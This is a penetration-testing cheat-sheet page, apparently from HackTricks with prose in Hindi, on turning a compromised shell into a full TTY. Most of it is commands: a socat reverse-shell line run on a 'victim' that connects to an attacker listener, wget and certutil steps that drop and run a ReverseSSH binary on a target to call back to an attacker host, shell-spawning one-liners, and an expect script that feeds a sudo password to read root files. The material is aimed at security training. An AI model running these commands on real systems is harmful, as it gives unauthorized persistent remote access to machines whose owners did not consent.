# Full TTYs

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Full TTY

ध्यान दें कि `SHELL` वेरिएबल में सेट किया गया शेल **ज़रूर** _**/etc/shells**_ के अंदर **सूचीबद्ध** होना चाहिए या `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`। इसके अलावा, ध्यान दें कि अगले स्निप्पेट्स केवल बैश में काम करते हैं। यदि आप ज़श में हैं, तो शेल प्राप्त करने से पहले `bash` चलाकर बैश में बदलें।

#### Python

{% code overflow="wrap" %}
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}

{% hint style="info" %}
आप **`stty -a`** चलाकर **पंक्तियों** और **स्तंभों** की **संख्या** प्राप्त कर सकते हैं।
{% endhint %}

#### स्क्रिप्ट

{% code overflow="wrap" %}
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}

#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **शेल उत्पन्न करें**

* `python -c 'import pty; pty.spawn("/bin/sh")'`
* `echo os.system('/bin/bash')`
* `/bin/sh -i`
* `script -qc /bin/bash /dev/null`
* `perl -e 'exec "/bin/sh";'`
* perl: `exec "/bin/sh";`
* ruby: `exec "/bin/sh"`
* lua: `os.execute('/bin/sh')`
* IRB: `exec "/bin/sh"`
* vi: `:!bash`
* vi: `:set shell=/bin/bash:shell`
* nmap: `!sh`

## ReverseSSH

**इंटरैक्टिव शेल एक्सेस**, साथ ही **फाइल ट्रांसफर** और **पोर्ट फॉरवर्डिंग** के लिए एक सुविधाजनक तरीका है लक्षित पर स्थिर-लिंक्ड ssh सर्वर [ReverseSSH](https://github.com/Fahrj/reverse-ssh) को छोड़ना।

नीचे `x86` के लिए एक उदाहरण है जिसमें upx-संपीड़ित बाइनरी हैं। अन्य बाइनरी के लिए, [रिलीज़ पृष्ठ](https://github.com/Fahrj/reverse-ssh/releases/latest/) देखें।

1. ssh पोर्ट फॉरवर्डिंग अनुरोध को पकड़ने के लिए स्थानीय रूप से तैयार करें:

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
{% endcode %}

* (2a) लिनक्स लक्ष्य:

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
{% endcode %}

* (2b) Windows 10 लक्ष्य (पुरानी संस्करणों के लिए, [प्रोजेक्ट रीडमी](https://github.com/Fahrj/reverse-ssh#features) देखें):

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
{% endcode %}

* यदि ReverseSSH पोर्ट फॉरवर्डिंग अनुरोध सफल रहा, तो आप अब `reverse-ssh(.exe)` चला रहे उपयोगकर्ता के संदर्भ में डिफ़ॉल्ट पासवर्ड `letmeinbrudipls` के साथ लॉग इन करने में सक्षम होना चाहिए:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) स्वचालित रूप से Linux रिवर्स शेल को TTY में अपग्रेड करता है, टर्मिनल के आकार को संभालता है, सब कुछ लॉग करता है और बहुत कुछ। यह Windows शेल के लिए readline समर्थन भी प्रदान करता है।

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

यदि किसी कारणवश आप पूर्ण TTY प्राप्त नहीं कर सकते हैं, तो आप **अभी भी उन कार्यक्रमों के साथ इंटरैक्ट कर सकते हैं** जो उपयोगकर्ता इनपुट की अपेक्षा करते हैं। निम्नलिखित उदाहरण में, पासवर्ड `sudo` को एक फ़ाइल पढ़ने के लिए पास किया जाता है:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **हमें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो करें।**
* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PRs सबमिट करें।

</details>
{% endhint %}
